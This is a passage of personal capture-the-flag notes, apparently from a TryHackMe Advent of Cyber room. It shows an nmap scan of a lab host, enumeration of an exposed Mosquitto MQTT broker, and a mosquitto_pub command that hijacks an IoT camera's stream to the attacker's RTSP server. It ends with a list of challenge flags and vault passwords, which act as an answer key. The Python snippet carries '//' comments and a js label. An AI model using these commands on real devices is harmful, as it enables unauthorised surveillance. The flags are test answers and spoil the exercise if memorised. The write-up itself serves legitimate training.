|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
|_http-title: Error response
|_http-server-header: WebSockify Python/3.8.10
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/clients/active: 4
|     $SYS/broker/load/publish/sent/15min: 9.47
|     $SYS/broker/publish/bytes/sent: 6769
|     $SYS/broker/load/bytes/received/5min: 218.51
|     $SYS/broker/load/messages/sent/15min: 12.52
|     $SYS/broker/load/messages/sent/5min: 15.54
|     $SYS/broker/load/bytes/received/15min: 212.43
|     $SYS/broker/bytes/sent: 14545
|     $SYS/broker/load/messages/received/5min: 9.18
|     $SYS/broker/load/sockets/1min: 0.93
|     $SYS/broker/load/publish/sent/1min: 6.97
|     $SYS/broker/load/messages/received/15min: 8.90
|     $SYS/broker/messages/sent: 561
|     $SYS/broker/uptime: 3245 seconds
|     $SYS/broker/load/bytes/sent/1min: 256.56
|     $SYS/broker/heap/current: 54952
|     $SYS/broker/load/publish/received/5min: 5.91
|     $SYS/broker/clients/disconnected: 0
|     $SYS/broker/publish/messages/received: 322
|     device/init: B26CWSPCWOBSBDC22V5K       # Notice this
|     $SYS/broker/load/bytes/sent/5min: 475.45
|     $SYS/broker/store/messages/bytes: 202
|     $SYS/broker/publish/messages/sent: 394
|     $SYS/broker/load/publish/received/1min: 5.66
|     $SYS/broker/load/bytes/sent/15min: 358.44
|     $SYS/broker/load/bytes/received/1min: 204.46
|     $SYS/broker/messages/received: 490
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/clients/inactive: 0
|     $SYS/broker/load/messages/sent/1min: 9.66
|     $SYS/broker/load/sockets/5min: 0.35
|     $SYS/broker/load/sockets/15min: 0.17
|     $SYS/broker/load/publish/sent/5min: 12.36
|     $SYS/broker/load/messages/received/1min: 8.38
|     $SYS/broker/clients/connected: 4
|     $SYS/broker/bytes/received: 11764
|_    $SYS/broker/publish/bytes/received: 6440
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=12/26%Time=63A999C5%P=x86_64-pc-linux-gnu%r(Get
SF:Request,291,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x2
SF:0WebSockify\x20Python/3\.8\.10\r\nDate:\x20Mon,\x2026\x20Dec\x202022\x2
SF:012:55:33\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/html;
SF:charset=utf-8\r\nContent-Length:\x20472\r\n\r\n<!DOCTYPE\x20HTML\x20PUB
SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20405
SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Method\x20Not\x20A
SF:llowed\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20expla
SF:nation:\x20405\x20-\x20Specified\x20method\x20is\x20invalid\x20for\x20t
SF:his\x20resource\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOptio
SF:ns,2B9,"HTTP/1\.1\x20501\x20Unsupported\x20method\x20\('OPTIONS'\)\r\nS
SF:erver:\x20WebSockify\x20Python/3\.8\.10\r\nDate:\x20Mon,\x2026\x20Dec\x
SF:202022\x2012:55:33\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20t
SF:ext/html;charset=utf-8\r\nContent-Length:\x20500\r\n\r\n<!DOCTYPE\x20HT
SF:ML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\
SF:x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-eq
SF:uiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x
SF:20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>
SF:Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20cod
SF:e:\x20501</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Unsupport
SF:ed\x20method\x20\('OPTIONS'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p
SF:>Error\x20code\x20explanation:\x20HTTPStatus\.NOT_IMPLEMENTED\x20-\x20S
SF:erver\x20does\x20not\x20support\x20this\x20operation\.</p>\n\x20\x20\x2
SF:0\x20</body>\n</html>\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/26%OT=22%CT=1%CU=38970%PV=Y%DS=2%DC=T%G=Y%TM=63A99A
OS:25%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST
OS:11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   54.75 ms 10.11.0.1
2   54.80 ms 10.10.99.109

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.37 seconds
```
**Notes:**
- `ssh` open on port 22
- `http` open on port 80
- `mosquitto` open on port 1883 - version `1.6.9`
- `device/init: B26CWSPCWOBSBDC22V5K`
- To query that topic directly:
	- mosquitto_sub -h 10.10.99.109 -t device/init  *we should get the same ID we found using nmap*
```sh
❯ mosquitto_sub -h 10.10.99.109 -t device/init
B26CWSPCWOBSBDC22V5K
B26CWSPCWOBSBDC22V5K
```
- We need the topic that we need to publish to the broker for the camera to send the stream
- We can do that by either reverse engineering or source-code analysis
- In our case we've been provided with the a snippet of the source-code
## Code snippet
```js
def subscribe(client: mqtt_client):
    def on_message(client, userdata, msg):    // receiving a message
        payload = msg.payload.decode()   // decoding the message
        topic = msg.topic        // saving the topic of the message in mem
        print("Topic:", topic)     // printing Topic: then the obtained topic
        print("Payload:", payload)  // printing Payload: then the obtained payload
        print("Parsing payload...") 
        payload = payload.replace("{", "") // replacing the { with a space 
        payload = payload.replace("}", "") // replacing the } with a space
        payload = payload.split(",") // splitting the payload with ,
        CMD = 0 // CMD comes first in the payload
        URL = 1 // URL comes second in the payload
        command_payload = payload[CMD]
        url_payload = payload[URL]
        print(command_payload)
        print(url_payload)
        target_cmd = "10"
        CMD_NAME = 0 // CMD name place is first
        CMD_VALUE = 1 // CMD value place is the second
        URL_NAME = 0 // URL name place is first
        URL_VALUE = 1 // URL value place is second
        command_payload = command_payload.split(":") // splitting the payload by :
        url_payload = url_payload.split(":", 1) // place of the payload after : 
        if command_payload[CMD_NAME].lower() == "cmd": // checking if CMD_NAME is cmd
            if command_payload[CMD_VALUE] == target_cmd: // checking if CMD_VALUE is 10 in line 701
                print("Command value match")
                if url_payload[URL_NAME].lower() == "url": // checking if URL_NAME is url
                    print("RTSPS URL match:", url_payload[URL_VALUE])
                    try:
                        f = open("../src/url.txt", "x")
                        f.write(url_payload[URL_VALUE]) // send a stream to the url provided
                        f.close()
                    except:
                        f = open("../src/url.txt", "w")
                        f.write(url_payload[URL_VALUE])
                        f.close()
                        
                    subprocess.call("../deploy/update.sh")

    client.subscribe(topic)
    client.on_message = on_message 
```
**Notes:**
- The format of a topic commonly takes the form of `<name>/<id>/<function>`
- The final format should look like `{"cmd":"10","url":""}`
## Setting up the listener server 
### Docker rtsp-simple-server
```sh
root@ip-10-10-222-227:~# docker run --rm -it --network=host aler9/rtsp-simple-server
2022/12/26 13:59:59 INF rtsp-simple-server v0.20.4
2022/12/26 13:59:59 INF [RTSP] listener opened on :8554 (TCP), :8000 (UDP/RTP), :8001 (UDP/RTCP)
2022/12/26 13:59:59 INF [RTMP] listener opened on :1935
2022/12/26 13:59:59 INF [HLS] listener opened on :8888
```
**Notes:**
- the message should be `{"cmd":"10","url":"rtsp://10.10.22.227:8554/sami"}`
### Publishing the message with mosuitto_pub
```sh
❯ mosquitto_pub -h 10.10.99.109 -t device/B26CWSPCWOBSBDC22V5K/cmd -m """{"cmd":"10","url":"rtsp://10.10.222.227:8554/sami"}"""
```
**Notes:**
- That should tell the camera to send its stream to `sami` path 
- In new terminal write `vlc rtsp://127.0.0.1:8554/sami`
![[Pasted image 20221226161620.png]]
# Day 23 `Defense in Depth` Mission ELFPossible: Abominable for a Day
Case 1: What is the password for Santa’s Vault?
	S3cr3tV@ultPW
Case 1: What is the Flag?  
	THM{EZ_fl@6!}
Case 2: What is Santa’s favourite thing?  
	MilkAndCookies
Case 2: What is the password for Santa’s Vault?  
	3XtrR@_S3cr3tV@ultPW
Case 2: What is the Flag?  
	THM{m0@r_5t3pS_n0w!}
Case 3: What is the Executive Assistant’s favourite thing?  
	BanoffeePie
Case 3: What is Santa’s previous password?  
	H0tCh0coL@t3_01
Case 3: What is Santa’s current password?  
	H0tCh0coL@t3_02
Case 3: What is the 1st part of the vault’s password?  
	N3w4nd1m
Case 3: What is the 2nd part of the vault’s password?  
	Pr0v3dV@ultPW
Case 3: What is the password for Santa’s Vault?  

Case 3: What is the Flag?  

What is Santa's Code?  

Mission ELFPossible: What is the Abominable for a Day Flag?